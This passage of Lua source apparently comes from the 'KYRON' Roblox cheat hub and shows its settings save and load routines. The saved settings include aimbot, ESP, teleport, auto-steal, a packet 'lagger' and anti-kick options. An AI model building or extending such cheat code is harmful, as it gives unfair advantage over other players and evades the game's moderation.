              local mainFrame = hub and hub:FindFirstChild("Main", true)
              if mainFrame then
                _G._KYRONMainPos = {
                  xs = mainFrame.Position.X.Scale,
                  xo = mainFrame.Position.X.Offset,
                  ys = mainFrame.Position.Y.Scale,
                  yo = mainFrame.Position.Y.Offset,
                }
              end
              local floatBtn = hub and hub:FindFirstChild("KYRONFloatOpen", true)
              if floatBtn then
                _G._KYRONFloatBtnPos = {
                  xs = floatBtn.Position.X.Scale,
                  xo = floatBtn.Position.X.Offset,
                  ys = floatBtn.Position.Y.Scale,
                  yo = floatBtn.Position.Y.Offset,
                  vw = viewport.X,
                  vh = viewport.Y,
                  nx = floatBtn.AbsolutePosition.X / viewport.X,
                  ny = floatBtn.AbsolutePosition.Y / viewport.Y,
                }
              end
              local stealBarHud = playerGui:FindFirstChild("KYRONStealBarHUD")
              local stealBar = stealBarHud and stealBarHud:FindFirstChild("StealBar")
              if stealBar then
                _G._KYRONStealBarPos = {
                  xs = stealBar.Position.X.Scale,
                  xo = stealBar.Position.X.Offset,
                  ys = stealBar.Position.Y.Scale,
                  yo = stealBar.Position.Y.Offset,
                  vw = viewport.X,
                  vh = viewport.Y,
                  nx = stealBar.AbsolutePosition.X / viewport.X,
                  ny = stealBar.AbsolutePosition.Y / viewport.Y,
                }
              end
            end
          end

          _G._KYRONSaveState.dirty = true
          local writing = _G._KYRONSaveState.writing
          local flag28

          if writing then
            flag28 = writing
          else
            local flag29 = not arg

            if flag29 then
              local lastAt = _G._KYRONSaveState.lastAt
              flag28 = tick() - lastAt < 0.25
            else
              flag28 = flag29
            end
          end

          if flag28 then
            if not _G._KYRONSaveState.queued then
              _G._KYRONSaveState.queued = true
              local lastAt = _G._KYRONSaveState.lastAt

              task.delay(math.max(0.1, 0.25 - tick() - lastAt), function()
                _G._KYRONSaveState.queued = false
                saveKYRONSettings(true)
              end)
            end

            return true
          end

          str9 = nil

          if not _G._KYRONResolveSaveApi() then
            str9 = "no file api"
            flag26 = false
            print("[KYRONSave] FAIL - no readfile/writefile API in executor")
            return false
          end

          local tbl37 = {
            configVersion = 5,
            userId = localPlayer.UserId,
            revision = (_G._KYRONSaveState.revision or 0) + 1,
          }

          tbl37.savedAt = os.time()
          tbl37.NS = movementSpeedSettings.NS
          tbl37.CS = movementSpeedSettings.CS
          tbl37.LG_N = movementSpeedSettings.LG_N
          tbl37.LG_C = movementSpeedSettings.LG_C
          tbl37.PL = movementSpeedSettings.PL
          tbl37.family = movementSpeedSettings.family
          tbl37.carry = movementSpeedSettings.carry
          tbl37.aimSpd = combatSettings.aimSpd
          tbl37.autoPathMatchSpeed = _G._KYRONAutoPathMatchSpeed == true
          tbl37.antiDropEnabled = _G._KYRONAntiDropEnabled == true
          tbl37.fovVal = visualSettings.fovVal
          tbl37.autoTPHeight = autoTeleportState.height
          tbl37.lookAtEnemyRadius = _G._KYRONLookAtEnemyRadius or 24
          tbl37.stealRadius = normalStealSettings.StealRadius
          tbl37.stealDuration = normalStealSettings.StealDuration
          tbl37.normalStealPausePercent = normalStealSettings.NormalStealPausePercent
          tbl37.laggerKey = laggerState.key and typeof(laggerState.key) == "EnumItem" and laggerState.key.Name or nil
          tbl37.lagPackets = laggerState.packets
          tbl37.lagDelay = laggerState.delay
          tbl37.skyMode = _G._KYRONSkyMode or "Lavender Dream"
          tbl37.animPack = _G._KYRONAnimPack or "Amazon Unboxed"
          tbl37.keys = _G._KYRONKbSave or {}
          tbl37.ctrlKeys = _G._KYRONCtrlSave or {}
          tbl37.bgIdx = _G._KYRONBgIdx ~= nil and _G._KYRONBgIdx or 0
          tbl37.bgOrder = 2
          tbl37.btnImgIdx = _G._KYRONBtnImgIdx or 1
          tbl37.themeIdx = _G._KYRONThemeIdx or 7
          tbl37.backgroundColorMatch = _G._KYRONBackgroundColorMatch or false
          tbl37.introEnabled = _G._KYRONIntroEnabled ~= false
          tbl37.introSongIndex = _G._KYRONIntroSongIndex or 1
          tbl37.introSongLocked = _G._KYRONIntroSongLocked == true
          tbl37.fontMode = _G._KYRONFontMode or "DEFAULT"
          tbl37.dropMode = dropMode
          tbl37.tpMode = tpMode
          tbl37.infJumpMode = _G._KYRONInfJumpMode or "TAP"
          tbl37.jumpPower = 55
          tbl37.batMode = _G._KYRONBatMode or "DEFAULT"
          tbl37.tpBatMode = _G._KYRONTpBatMode or "HIGH PING"
          tbl37.tpBatSwingDelay = _G._KYRONTpBatSwingDelay or 0.007
          tbl37.tpBatV3Enabled = _G._KYRONTpBatV3Enabled == true
          tbl37.tpBatV4Enabled = _G._KYRONTpBatV4Enabled == true
          tbl37.stealMode = _G._KYRONStealMode or "NORMAL"
          tbl37.autoCarryMode = _G._KYRONAutoCarryMode or "WHEN NEAR"
          tbl37.autoCarrySpeedEnabled = _G._KYRONAutoCarrySpeedEnabled == true
          tbl37.autoCarryEnemyBaseEnabled = _G._KYRONAutoCarryEnemyBaseEnabled == true
          tbl37.autoCarryEnemyBaseRange = math.clamp(tonumber(_G._KYRONAutoCarryEnemyBaseRange) or 35, 5, 150)
          tbl37.semiRange = stealController and stealController.CFG and stealController.CFG.STEAL_RANGE or 8.7
          tbl37.semiPrime = stealController and stealController.CFG and stealController.CFG.PRIME_RANGE or 100
          tbl37.mainPos = _G._KYRONMainPos
          tbl37.floatBtnPos = _G._KYRONFloatBtnPos
          tbl37.btnScale = _G._KYRONMobileBtnScale or 1
          tbl37.btnCircle = _G._KYRONCircleButtons == true
          tbl37.advancedLaggerButton = _G._KYRONAdvancedLaggerButton == true
          tbl37.mobileButtonsHidden = _G._KYRONMobileButtonsHidden == true
          tbl37.hiddenMobileButtons = _G._KYRONHiddenMobileButtons or {}
          tbl37.uiScale = _G._KYRONUIScale or 65
          tbl37.stealBarScale = _G._KYRONStealBarScale or KYRONStealBarScale
          tbl37.stealBarPos = _G._KYRONStealBarPos
          tbl37.stealBarMatch = _G._KYRONStealBarMatch == true
          tbl37.btnLocked = _G._KYRONMobileBtnLocked
          tbl37.uiLocked = _G._KYRONUiLocked or false
          tbl37.mobileButtonProfiles = _G._KYRONMobileBtnPositions or {}

          tbl37.skin = {
            enabled = _G._KYRONSkin and _G._KYRONSkin.IsEnabled() == true or false,
            preset = _G._KYRONSkin and _G._KYRONSkin.GetPreset() or "KYRON",
          }

          tbl37.on = {
            antiRag = ragdollRecoveryState.enabled or false,
            lookAtEnemy = _G._KYRONLookAtEnemyEnabled == true,
            neonWhiteTools = _G._KYRONNeonWhiteToolsEnabled == true,
            autoTP = autoTeleportState.enabled or false,
            autoSteal = autoStealSettings.AutoSteal or false,
            ragdollSteal = _G._KYRONRagdollStealEnabled ~= false,
            batAimbot = combatSettings.aimbot == true or _G._KYRONSafeModeState and _G._KYRONSafeModeState.pending and _G._KYRONSafeModeState.pending.aimbot == true or false,
            tpBat = combatSettings.desync or false,
            mirrorTP = combatSettings.tpMirror or false,
            desyncMode = "V2",
            autoLeft = autoPathState.L == true,
            autoRight = autoPathState.R == true,
            autoCarry = _G._KYRONAutoCarry == true,
            autoCarrySpeed = _G._KYRONAutoCarrySpeedEnabled == true,
            autoCarryEnemyBase = _G._KYRONAutoCarryEnemyBaseEnabled == true,
            safeMode = _G._KYRONSafeModeEnabled == true,
            kickWarning = _G._KYRONKickWarningEnabled ~= false,
            autoSwing = combatSettings.swing or false,
            fov = visualSettings.fov or false,
            stretch = visualSettings.stretch or false,
            antiLag = visualSettings.antilag or false,
            potatoGraphics = _G._KYRONPotatoGraphics == true,
            infJump = flag14 or false,
            tryHard = _G._KYRONTryHard and _G._KYRONTryHard.enabled or false,
            antiBat = _G._KYRONAntiBat and _G._KYRONAntiBat.enabled or false,
            batCounter = _G._VezyBatCounterOn or false,
            batCounterMode = _G._KYRONOshaBatCounter and _G._KYRONOshaBatCounter.mode or _G._KYRONBatCounterMode or "V1",
            medusaCounter = flag25 or false,
            hardHit = combatSettings.hardHit == true,
            hardHitRange = tonumber(combatSettings.hardHitRange) or 10,
            perfectHit = combatSettings.perfectHit == true,
            perfectHitRange = tonumber(combatSettings.perfectHitRange) or 175,
            ragCountdown = _G._KYRONRagCountdownEnabled ~= false,
            esp = _G._KYRONESPEnabled or false,
            showTracer = _G._KYRONESPShowTracer == nil and true or _G._KYRONESPShowTracer,
          }

          _G._KYRONSaveState.writing = true

          local ok, result = pcall(function()
            if not fn42() then
              error("superseded save session")
            end

            local v78, v79 = _G._KYRONWriteJsonVerified(_G._KYRONSaveFiles.pending, tbl37)

            if not v78 then
              error(v79)
            end

            if _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.config) then
              local ok, result = pcall(_G._KYRONSaveFiles.read, _G._KYRONSaveFiles.config)

              local ok2, result2 = pcall(function()
                return HttpService:JSONDecode(result)
              end)

              ok2 = ok and ok2

              if ok2 then
                ok2 = type(result2) == "table"
              end

              ok2 = ok2 and result2.configVersion == 5

              if ok2 then
                local userId = localPlayer.UserId
                ok2 = tonumber(result2.userId) == userId
              end

              ok2 = ok2 and type(result2.keys) == "table" and type(result2.ctrlKeys) == "table"

              if ok2 then
                ok2 = type(result2.on) == "table"
              end

              if ok2 then
                ok2 = type(result2.mobileButtonProfiles) == "table"
              end

              if ok2 and type(result2.skin) == "table" then
                pcall(function()
                  _G._KYRONSaveFiles.write(_G._KYRONSaveFiles.backup, result)

                  if _G._KYRONSaveFiles.read(_G._KYRONSaveFiles.backup) ~= result then
                    error("backup read-back failed")
                  end
                end)
              end
            end

            local v80, v81 = _G._KYRONWriteJsonVerified(_G._KYRONSaveFiles.config, tbl37)

            if not v80 then
              error(v81)
            end
          end)

          _G._KYRONSaveState.writing = false
          if not fn42() then
            return false
          end
          _G._KYRONSaveState.lastAt = tick()

          if not ok then
            str9 = tostring(result):sub(1, 60)
            flag26 = false
            print("[KYRONSave] FAIL:", result)
            return false
          end

          _G._KYRONSaveState.revision = tbl37.revision
          _G._KYRONSaveState.dirty = false
          flag26 = true

          if _G._KYRONShowSaveToast then
            task.spawn(_G._KYRONShowSaveToast)
          end

          local tbl38 = {}

          for k, v78 in pairs(tbl37.on) do
            if v78 then
              tbl38[#tbl38 + 1] = k
            end
          end

          local concat = table.concat
          print(
            string.format(
              "[KYRONSave] OK NS=%s CS=%s LG=%s/%s family=%s carry=%s sky=%s anim=%s drop=%s tp=%s inf=%s bat=%s ON=[%s]",
              tostring(tbl37.NS),
              tostring(tbl37.CS),
              tostring(tbl37.LG_N),
              tostring(tbl37.LG_C),
              tostring(tbl37.family),
              tostring(tbl37.carry),
              tostring(tbl37.skyMode),
              tostring(tbl37.animPack),
              tostring(tbl37.dropMode),
              tostring(tbl37.tpMode),
              tostring(tbl37.infJumpMode),
              tostring(tbl37.batMode),
              concat(tbl38, ",")
            )
          )
          return true
        end

        _G._KYRONRequestSave = function(arg)
          if not fn42() then
            return false
          end
          _G._KYRONSaveState.dirty = true
          return saveKYRONSettings(arg == true)
        end

        fn43 = function()
          if not _G._KYRONResolveSaveApi() then
            print("[KYRONLoad] SKIP - no readfile/writefile API")
            return
          end
          local KYRONLoadedUnifiedV5 = false
          local revision = -1
          local flag28 = false
          local str10 = nil
          local str11 = nil
          local tbl37 = nil

          for _, v78 in ipairs({
            _G._KYRONSaveFiles.config,
            _G._KYRONSaveFiles.pending,
            _G._KYRONSaveFiles.backup,
          }) do
            if _G._KYRONSaveFiles.isfile(v78) then
              local ok, result = pcall(_G._KYRONSaveFiles.read, v78)

              local ok2, result2 = pcall(function()
                return HttpService:JSONDecode(result)
              end)

              local flag29

              if ok2 then
                flag29 = type(result2) == "table"
              else
                flag29 = ok2
              end

              flag29 = flag29 and tonumber(result2.revision) or -1
              ok2 = ok and ok2 and type(result2) == "table" and result2.configVersion == 5

              if ok2 then
                local userId = localPlayer.UserId
                ok2 = tonumber(result2.userId) == userId
              end

              if ok2 and flag29 >= 0 and type(result2.on) == "table" and flag29 > revision then
                -- Normalize optional tables so older / partial saves still load.
                if type(result2.keys) ~= "table" then
                  result2.keys = {}
                end
                if type(result2.ctrlKeys) ~= "table" then
                  result2.ctrlKeys = {}
                end
                if type(result2.mobileButtonProfiles) ~= "table" then
                  result2.mobileButtonProfiles = {}
                end
                if type(result2.skin) ~= "table" then
                  result2.skin = { enabled = false, preset = "KYRON" }
                end
                str11 = result
                revision = flag29
                str10 = v78
                tbl37 = result2
              end

              flag28 = true
            end
          end

          if tbl37 then
            _G._KYRONSaveState.revision = revision
            KYRONLoadedUnifiedV5 = true
          else
            for _, v78 in ipairs({
              _G._KYRONSaveFiles.legacyConfig,
              _G._KYRONSaveFiles.legacyConfigBackup,
              _G._KYRONSaveFiles.legacy,
              _G._KYRONSaveFiles.legacyShared,
              "KYRONHubMobile.json",
            }) do
              if not tbl37 and _G._KYRONSaveFiles.isfile(v78) then
                flag28 = true
                local ok, result = pcall(_G._KYRONSaveFiles.read, v78)

                local ok2, result2 = pcall(function()
                  return HttpService:JSONDecode(result)
                end)

                ok2 = ok and ok2

                if ok2 then
                  ok2 = type(result2) == "table"
                end

                if ok2 then
                  str11 = result
                  tbl37 = result2
                  str10 = v78
                end
              end
            end

            local flag29 = not tbl37 and not flag28
            local v78

            if flag29 then
              v78 = _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.keybinds)
                or _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.buttons)
                or _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.skin)
                or _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.controller)
            else
              v78 = flag29
            end

            if v78 then
              str11 = "{}"
              flag28 = true
              str10 = "V4 split files"
              tbl37 = {}
            end
          end

          if type(tbl37) ~= "table" then
            pcall(_G._KYRONLoadControllerBindings)
            if flag28 then
              print("[KYRONLoad] FAIL - config files exist but none passed validation. Starting fresh.")
            else
              print("[KYRONLoad] SKIP - no config yet")
            end
            _G._KYRONConfigLoadReady = true
            return true
          end

          _G._KYRONLoadedUnifiedV5 = KYRONLoadedUnifiedV5
          print(string.format("[KYRONLoad] Reading %d bytes from %s", #str11, str10))

          if type(tbl37.NS) == "number" then
            movementSpeedSettings.NS = math.max(tbl37.NS, 0)
          end

          if type(tbl37.CS) == "number" then
            movementSpeedSettings.CS = math.max(tbl37.CS, 0)
          end

          if type(tbl37.LG_N) == "number" then
            movementSpeedSettings.LG_N = math.clamp(tbl37.LG_N, 0, 200)
          end

          if type(tbl37.LG_C) == "number" then
            movementSpeedSettings.LG_C = math.clamp(tbl37.LG_C, 0, 60)
          end

          if type(tbl37.PL) == "number" then
            movementSpeedSettings.PL = tbl37.PL
          end

          if type(tbl37.carry) == "boolean" then
            movementSpeedSettings.carry = tbl37.carry
          end

          if tbl37.family == "normal" or tbl37.family == "lagger" or tbl37.family == "pinglagger" then
            movementSpeedSettings.family = tbl37.family
          end

          if type(tbl37.aimSpd) == "number" then
            combatSettings.aimSpd = tbl37.aimSpd
          end

          if type(tbl37.autoPathMatchSpeed) == "boolean" then
            _G._KYRONAutoPathMatchSpeed = tbl37.autoPathMatchSpeed
          end

          if type(tbl37.antiDropEnabled) == "boolean" then
            _G._KYRONAntiDropEnabled = tbl37.antiDropEnabled
          end

          if type(tbl37.fovVal) == "number" then
            visualSettings.fovVal = tbl37.fovVal
          end

          if type(tbl37.autoTPHeight) == "number" then
            autoTeleportState.height = tbl37.autoTPHeight
          end

          if type(tbl37.stealRadius) == "number" then
            normalStealSettings.StealRadius = math.clamp(tbl37.stealRadius, 1, 250)
          end

          if type(tbl37.normalStealPausePercent) == "number" then
            normalStealSettings.NormalStealPausePercent = _G._KYRONNormalizeNormalPausePercent(tbl37.normalStealPausePercent)
          end

          if tbl37.fontMode == "PIXEL" or tbl37.fontMode == "DEFAULT" then
            _G._KYRONFontMode = tbl37.fontMode
          end

          normalStealSettings.StealDuration = 1.3

          if type(tbl37.laggerKey) == "string" and Enum.KeyCode[tbl37.laggerKey] then
            laggerState.key = Enum.KeyCode[tbl37.laggerKey]
          end

          if type(tbl37.lagPackets) == "number" then
            laggerState.packets = math.clamp(math.floor(tbl37.lagPackets), 1, 1500)
          end

          if type(tbl37.lagDelay) == "number" then
            laggerState.delay = math.clamp(tbl37.lagDelay, 0.05, 5)
          end

          if type(tbl37.skyMode) == "string" then
            _G._KYRONSkyMode = tbl37.skyMode
          end

          if type(tbl37.animPack) == "string" then
            _G._KYRONAnimPack = tbl37.animPack
          end

          local v82 = tbl37

          if not KYRONLoadedUnifiedV5 then
            pcall(function()
              if _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.keybinds) then
                local data = HttpService:JSONDecode(_G._KYRONSaveFiles.read(_G._KYRONSaveFiles.keybinds))

                if type(data) == "table" then
                  v82 = data
                end
              end
            end)
          end

          if type(v82.keys) == "table" then
            _G._KYRONKbSave = v82.keys
          end

          if type(v82.ctrlKeys) == "table" then
            _G._KYRONCtrlSave = v82.ctrlKeys
          end

          if KYRONLoadedUnifiedV5 and not _G._KYRONHasSavedGamepadBind(_G._KYRONCtrlSave) then
            pcall(function()
              if _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.keybinds) then
                local data = HttpService:JSONDecode(_G._KYRONSaveFiles.read(_G._KYRONSaveFiles.keybinds))

                if type(data) == "table" and _G._KYRONHasSavedGamepadBind(data.ctrlKeys) then
                  _G._KYRONCtrlSave = data.ctrlKeys
                end
              end
            end)
          end

          pcall(_G._KYRONLoadControllerBindings)

          if type(v82.laggerKey) == "string" and Enum.KeyCode[v82.laggerKey] then
            laggerState.key = Enum.KeyCode[v82.laggerKey]
          end

          if _G._KYRONKbSave and not _G._KYRONKbSave["TP Bat Key"] and _G._KYRONKbSave["Desync Aimbot Key"] then
            _G._KYRONKbSave["TP Bat Key"] = _G._KYRONKbSave["Desync Aimbot Key"]
            _G._KYRONKbSave["Desync Aimbot Key"] = nil
          end

          if _G._KYRONCtrlSave and not _G._KYRONCtrlSave["TP Bat Key"] and _G._KYRONCtrlSave["Desync Aimbot Key"] then
            _G._KYRONCtrlSave["TP Bat Key"] = _G._KYRONCtrlSave["Desync Aimbot Key"]
            _G._KYRONCtrlSave["Desync Aimbot Key"] = nil
          end

          if type(tbl37.bgIdx) == "number" and tbl37.bgIdx >= 0 and tbl37.bgIdx <= 6 then
            local KYRONBgIdx = math.floor(tbl37.bgIdx)

            if tbl37.bgOrder ~= 2 then
              KYRONBgIdx = ({
                [0] = 0,
                1,
                [2] = 2,
                [3] = 5,
                [4] = 6,
                [10] = 7,
                [6] = 3,
                [7] = 8,
                [24] = 4,
              })[KYRONBgIdx] or 0
            end

            _G._KYRONBgIdx = KYRONBgIdx
          end

          if type(tbl37.btnImgIdx) == "number" and tbl37.btnImgIdx >= 1 and tbl37.btnImgIdx <= 12 then
            _G._KYRONBtnImgIdx = math.floor(tbl37.btnImgIdx)
          end

          if type(tbl37.themeIdx) == "number" then
            _G._KYRONThemeIdx = math.max(1, math.floor(tbl37.themeIdx))
          end

          if type(tbl37.backgroundColorMatch) == "boolean" then
            _G._KYRONBackgroundColorMatch = tbl37.backgroundColorMatch
          end

          if type(tbl37.introEnabled) == "boolean" then
            _G._KYRONIntroEnabled = tbl37.introEnabled
          end

          if _G._KYRONVoltCompatibility then
            _G._KYRONAntiDropEnabled = false
          end

          _G._KYRONIntroSongLocked = tbl37.introSongLocked == true

          if _G._KYRONIntroSongLocked and type(tbl37.introSongIndex) == "number" then
            local n34 = #introSongs
            _G._KYRONIntroSongIndex = math.clamp(math.floor(tbl37.introSongIndex), 1, n34)
          else
            _G._KYRONIntroSongIndex = KYRONIntroSongIndex
          end

          dropMode = "JUMP"
          tpMode = "full"
          _G._KYRONInfJumpMode = "HOLD"
          _G._KYRONJumpPower = 55

          if tbl37.batMode == "DEFAULT" or tbl37.batMode == "BYPASS" then
            _G._KYRONBatMode = tbl37.batMode
          else
            _G._KYRONBatMode = "DEFAULT"
          end

          combatSettings.antiMode = _G._KYRONBatMode == "BYPASS"

          if tbl37.tpBatMode == "SURE HIT" then
            _G._KYRONTpBatMode = "LOW PING"
          elseif tbl37.tpBatMode == "LOW PING" or tbl37.tpBatMode == "HIGH PING" then
            _G._KYRONTpBatMode = tbl37.tpBatMode
          end

          if type(tbl37.tpBatSwingDelay) == "number" then
            _G._KYRONTpBatSwingDelay = math.clamp(tbl37.tpBatSwingDelay, 0.001, 1)
          end
          if type(tbl37.tpBatV3Enabled) == "boolean" then
            _G._KYRONTpBatV3Enabled = tbl37.tpBatV3Enabled
          end
          if type(tbl37.tpBatV4Enabled) == "boolean" then
            _G._KYRONTpBatV4Enabled = tbl37.tpBatV4Enabled
          end

          if tbl37.stealMode == "NORMAL" or tbl37.stealMode == "SEMI" then
            _G._KYRONStealMode = tbl37.stealMode
          end

          if tbl37.autoCarryMode == "ON STEAL" or tbl37.autoCarryMode == "WHEN NEAR" then
            _G._KYRONAutoCarryMode = tbl37.autoCarryMode
          end

          if type(tbl37.autoCarrySpeedEnabled) == "boolean" then
            _G._KYRONAutoCarrySpeedEnabled = tbl37.autoCarrySpeedEnabled
          end

          if type(tbl37.autoCarryEnemyBaseEnabled) == "boolean" then
            _G._KYRONAutoCarryEnemyBaseEnabled = tbl37.autoCarryEnemyBaseEnabled
          end

          if type(tbl37.autoCarryEnemyBaseRange) == "number" then
            _G._KYRONAutoCarryEnemyBaseRange = math.clamp(tbl37.autoCarryEnemyBaseRange, 5, 150)
          end

          if type(tbl37.semiRange) == "number" and stealController and stealController.CFG then
            stealController.CFG.STEAL_RANGE = (tbl37.semiRange == 62 or tbl37.semiRange == 8.5) and 8.7 or tbl37.semiRange
          end

          if stealController and stealController.CFG then
            stealController.CFG.PRIME_RANGE = 80
          end

          _G._KYRONMobileBtnPositions = {}
          _G._KYRONLegacyDesktopBtnPos = nil

          if KYRONLoadedUnifiedV5 and type(tbl37.mobileButtonProfiles) == "table" then
            _G._KYRONMobileBtnPositions = tbl37.mobileButtonProfiles
          else
            pcall(function()
              if _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.buttons) then
                local data = HttpService:JSONDecode(_G._KYRONSaveFiles.read(_G._KYRONSaveFiles.buttons))
                local flag29 = type(data) == "table"

                if flag29 then
                  flag29 = type(data.profiles) == "table"
                end

                if flag29 then
                  _G._KYRONMobileBtnPositions = data.profiles
                end
              end
            end)
          end

          local flag29

          if KYRONLoadedUnifiedV5 then
            flag29 = type(tbl37.skin) == "table"
          else
            flag29 = KYRONLoadedUnifiedV5
          end

          if flag29 and _G._KYRONSkin and _G._KYRONSkin.SetState then
            pcall(_G._KYRONSkin.SetState, tbl37.skin.enabled == true, tbl37.skin.preset, true)
          elseif not KYRONLoadedUnifiedV5 and _G._KYRONSkin and _G._KYRONSkin.SetState then
            pcall(function()
              if _G._KYRONSaveFiles.isfile(_G._KYRONSaveFiles.skin) then
                local data = HttpService:JSONDecode(_G._KYRONSaveFiles.read(_G._KYRONSaveFiles.skin))

                if type(data) == "table" then
                  _G._KYRONSkin.SetState(data.enabled == true, data.preset, true)
                end
              end
            end)
          end

          if type(tbl37.mainPos) == "table" then
            _G._KYRONMainPos = tbl37.mainPos
          end

          if type(tbl37.btnScale) == "number" then
            _G._KYRONMobileBtnScale = tbl37.btnScale
          end

          if type(tbl37.btnCircle) == "boolean" then
            _G._KYRONCircleButtons = tbl37.btnCircle
          end

          if type(tbl37.advancedLaggerButton) == "boolean" then
            _G._KYRONAdvancedLaggerButton = tbl37.advancedLaggerButton
          end

          if type(tbl37.mobileButtonsHidden) == "boolean" then
            _G._KYRONMobileButtonsHidden = tbl37.mobileButtonsHidden
          end

          if type(tbl37.hiddenMobileButtons) == "table" then
            _G._KYRONHiddenMobileButtons = tbl37.hiddenMobileButtons
          end

          if type(tbl37.uiScale) == "number" then
            _G._KYRONUIScale = tbl37.uiScale
          end

          if type(tbl37.stealBarScale) == "number" then
            KYRONStealBarScale = math.clamp(math.floor(tbl37.stealBarScale + 0.5), 50, 150)
            updateStealBarScale()
          end

          if type(tbl37.stealBarPos) == "table" then
            _G._KYRONStealBarPos = tbl37.stealBarPos

            if _G._KYRONApplyStealBarPosition then
              pcall(_G._KYRONApplyStealBarPosition)
            end
          end

          if type(tbl37.stealBarMatch) == "boolean" then
            _G._KYRONStealBarMatch = tbl37.stealBarMatch
          end

          if _G._KYRONApplyStealBarBackground then
            pcall(_G._KYRONApplyStealBarBackground)
          end

          if type(tbl37.lookAtEnemyRadius) == "number" then
            _G._KYRONLookAtEnemyRadius = math.clamp(tbl37.lookAtEnemyRadius, 1, 200)
          end

          local v88 = _G

          v88._KYRONFloatBtnPos = type(tbl37.floatBtnPos) == "table" and tbl37.floatBtnPos or nil

          if type(tbl37.btnLocked) == "boolean" then
            _G._KYRONBtnLockedLoaded = tbl37.btnLocked
          end

          if type(tbl37.uiLocked) == "boolean" then
            _G._KYRONUiLocked = tbl37.uiLocked
          end

          if type(tbl37.on) == "table" then
            local on = tbl37.on

            if type(on.antiRag) == "boolean" then
              flag16 = on.antiRag
            end

            if type(on.lookAtEnemy) == "boolean" then
              _G._KYRONLoadedOnLookAtEnemy = on.lookAtEnemy
            end

            if type(on.neonWhiteTools) == "boolean" then
              _G._KYRONLoadedOnNeonWhiteTools = on.neonWhiteTools
            end

            if type(on.autoTP) == "boolean" then
              flag17 = on.autoTP
            end

            if type(on.autoSteal) == "boolean" then
              flag18 = on.autoSteal
            end

            if type(on.ragdollSteal) == "boolean" then
              _G._KYRONRagdollStealEnabled = on.ragdollSteal
            end

            if type(on.batAimbot) == "boolean" then
              _G._loadedOn_batAimbot = on.batAimbot
            end

            if type(on.mirrorTP) == "boolean" then
              _G._loadedOn_mirrorTP = on.mirrorTP
            end

            if type(on.hardHit) == "boolean" then
              combatSettings.hardHit = on.hardHit
              _G._KYRONRyzenHardHit.enabled = on.hardHit
            end
            if type(on.hardHitRange) == "number" then
              KYRONSetHardHitRange(on.hardHitRange)
            end
            if type(on.perfectHit) == "boolean" then
              combatSettings.perfectHit = on.perfectHit
              _G._KYRONRyzenPerfectHit.enabled = on.perfectHit
            end
            if type(on.perfectHitRange) == "number" then
              KYRONSetPerfectHitRange(on.perfectHitRange)
            end

            combatSettings.tpMirror = _G._loadedOn_mirrorTP == true

            if type(on.tpBat) == "boolean" then
              _G._loadedOn_desyncAimbot = on.tpBat
            end

            _G._KYRONDesyncMode = "V2"
            _G._loadedOn_autoLeft = on.autoLeft == true
            _G._loadedOn_autoRight = on.autoRight == true

            if type(on.autoCarry) == "boolean" then
              _G._loadedOn_autoCarry = on.autoCarry
              _G._KYRONAutoCarry = on.autoCarry
            end

            if type(on.autoCarrySpeed) == "boolean" then
              _G._loadedOn_autoCarrySpeed = on.autoCarrySpeed
              _G._KYRONAutoCarrySpeedEnabled = on.autoCarrySpeed
            end

            if type(on.autoCarryEnemyBase) == "boolean" then
              _G._loadedOn_autoCarryEnemyBase = on.autoCarryEnemyBase
              _G._KYRONAutoCarryEnemyBaseEnabled = on.autoCarryEnemyBase
            end

            if type(on.safeMode) == "boolean" then
              _G._loadedOn_safeMode = on.safeMode
              _G._KYRONSafeModeEnabled = on.safeMode
            end

            if type(on.kickWarning) == "boolean" then
              _G._loadedOn_kickWarning = on.kickWarning
              _G._KYRONKickWarningEnabled = on.kickWarning
            end

            if type(on.autoSwing) == "boolean" then
              _G._loadedOn_autoSwing = on.autoSwing
            end

            if type(on.fov) == "boolean" then
              flag22 = on.fov
            end

            if type(on.stretch) == "boolean" then
              flag21 = on.stretch
            end

            if type(on.antiLag) == "boolean" then
              antiLag = on.antiLag
            end

            if type(on.potatoGraphics) == "boolean" then
              _G._KYRONLoadedOnPotato = on.potatoGraphics
            end

            if type(on.infJump) == "boolean" then
              infJump = on.infJump
            end

            if type(on.tryHard) == "boolean" then
              _G._KYRONLoadedTryHard = on.tryHard
            end

            if type(on.antiBat) == "boolean" then
              _G._KYRONLoadedAntiBat = on.antiBat
            end

            if type(on.batCounter) == "boolean" then
              flag19 = on.batCounter
            end

            if on.batCounterMode == "V1" or on.batCounterMode == "V2" then
              _G._KYRONBatCounterMode = on.batCounterMode
            end

            if type(on.medusaCounter) == "boolean" then
              flag20 = on.medusaCounter
            end

            if type(on.ragCountdown) == "boolean" then
              _G._KYRONRagCountdownEnabled = on.ragCountdown
            end

            if type(on.esp) == "boolean" then
              flag23 = on.esp
            end

            if type(on.showTracer) == "boolean" then
              flag24 = on.showTracer
            end
          end

          if _G._KYRONVoltCompatibility then
            _G._KYRONLoadedOnNeonWhiteTools = false
          end

          if _G._KYRONSkyMode and _G._KYRONSkyMode ~= "Off" then
            task.spawn(function()
              task.wait(0.5)
              pcall(_G._KYRONStartSky, _G._KYRONSkyMode)
            end)
          end

          local tbl38 = {}

          if type(tbl37.on) == "table" then
            for k, v90 in pairs(tbl37.on) do
              if v90 then
                tbl38[#tbl38 + 1] = k
              end
            end
          end

          local concat = table.concat
          print(
            string.format(
              "[KYRONLoad] OK NS=%s family=%s carry=%s sky=%s drop=%s tp=%s bat=%s ON=[%s]",
              tostring(tbl37.NS),
              tostring(tbl37.family),
              tostring(tbl37.carry),
              tostring(tbl37.skyMode),
              tostring(tbl37.dropMode),
              tostring(tbl37.tpMode),
              tostring(tbl37.batMode),
              concat(tbl38, ",")
            )
          )
          _G._KYRONConfigLoadReady = true
          return true
        end

        fn44 = function()
          local character = localPlayer.Character
          if not character then
            return nil
          end

          for _, child in ipairs(character:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
              return child
            end
          end

          local backpack = localPlayer:FindFirstChild("Backpack")

          if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
              if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
              end
            end
          end

          return nil
        end

        fn45 = function()
